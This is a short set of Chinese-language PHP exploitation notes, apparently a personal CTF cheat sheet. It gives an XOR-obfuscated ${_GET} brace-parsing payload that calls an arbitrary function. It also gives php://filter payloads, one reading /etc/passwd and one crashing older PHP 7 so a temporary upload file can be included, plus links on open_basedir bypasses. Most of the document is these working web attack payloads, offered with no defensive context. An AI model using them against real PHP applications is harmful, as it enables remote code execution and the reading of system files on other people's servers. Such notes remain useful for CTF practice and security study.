php的tips

[TOC]



- ###### php的花括号解析输入，来执行函数get_the_flag，最终payload

```
?_=${%fe%fe%fe%fe^%a1%b9%bb%aa}{%fe}();&%fe=get_the_flag
就是_=${_GET}{%fe}()
php会自动解析这段代码，因为有{}


```

###### php open_basedir bypass的poc

[从PHP底层看open_basedir bypass · sky's blog (skysec.top)](https://skysec.top/2019/04/12/从PHP底层看open-basedir-bypass/)



[关于php文件操作的几个小trick - tr1ple - 博客园 (cnblogs.com)](https://www.cnblogs.com/tr1ple/p/11301743.html)



###### include() 临时文件上传包含

```
php < 7.2 

php://filter/string.strip_tags/resource=/etc/passwd

php7 老版本通杀
php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA
 

```

有py脚本。

再

![1708950820205](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1708950820205.png)

![1708950803491](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1708950803491.png)

每次上传完会在/tem中留下一个文件，Include这个文件。文件名访问dir.php得到

#### creat_funtions()

